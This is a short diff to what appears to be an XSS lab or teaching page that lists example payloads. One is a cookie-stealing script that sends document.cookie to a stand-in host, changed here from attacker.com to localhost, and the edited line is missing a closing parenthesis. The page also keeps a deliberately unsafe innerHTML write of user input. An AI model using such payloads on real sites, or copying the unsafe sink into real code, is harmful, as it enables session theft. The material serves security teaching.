@@ -174,7 +174,7 @@
                 <pre>&lt;script&gt;alert('XSS Test')&lt;/script&gt;</pre>
                 
                 <li><strong>Stealing Cookies:</strong></li>
-                <pre>&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;
+                <pre>&lt;script&gt;fetch('http://127.0.0.1:8080/steal?cookie=' + encodeURIComponent(document.cookie);&lt;/script&gt;
                 </pre>
 
                 <li><strong>Defacement:</strong></li>
@@ -204,7 +204,7 @@
             const previewDiv = document.getElementById('confirm');
             previewDiv.innerHTML = `Your name: ${name}`;
         }
-        
+
         /*
         function confirmname() {
         var name = document.querySelector('textarea[name="name"]').value;
